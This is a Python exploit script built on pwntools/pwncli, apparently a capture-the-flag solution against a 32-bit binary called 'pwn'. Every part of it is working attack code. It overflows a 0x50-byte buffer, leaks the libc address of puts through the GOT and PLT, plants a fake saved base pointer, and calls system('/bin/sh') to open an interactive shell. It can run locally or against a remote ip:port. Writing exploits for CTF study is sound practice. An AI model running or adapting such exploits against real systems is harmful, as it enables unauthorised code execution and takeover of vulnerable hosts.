#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

buf_addr = 0x804c020
main_addr = 0x080491D3

burp_payload = lambda payload: ( payload * (0x50 // len(payload)) ).ljust(0x50, b"a")
payload = p32(main_addr) + p32(elf.got["puts"]) + p32(elf.got["puts"]) + p32(elf.plt["puts"])

# payload =  p32(elf.plt["gets"]) + p32(elf.got["puts"]) + p32(buf_addr) + p32(0xdeadbeef)
# payload += p32(buf_addr) + p32(main_addr) + p32(0xdeadbeef) + p32(elf.plt["puts"])

payload = burp_payload(payload)
ru(b'Is this solveable?\n')
sl(payload)

libc_base = u32_ex(r(4)) - libc.sym.puts
lg("libc_base")

ru(b'Is this solveable?\n')
payload = p32(0xcafecafe)
payload = burp_payload(payload)
payload += p32(0x264ba4+libc_base+4)
sl(payload)

ru(b'Is this solveable?\n')
fake_bp = libc_base + 0x264ad8
lg("fake_bp")
payload = b"a"*0x50 + p32(fake_bp+0x18)
payload += p32(0)*6
payload += p32(libc_base+libc.sym.system)
payload += p32(0xdeadbeef)
payload += p32(libc_base+next(libc.search(b"/bin/sh\x00")))
sl(payload)

ia()
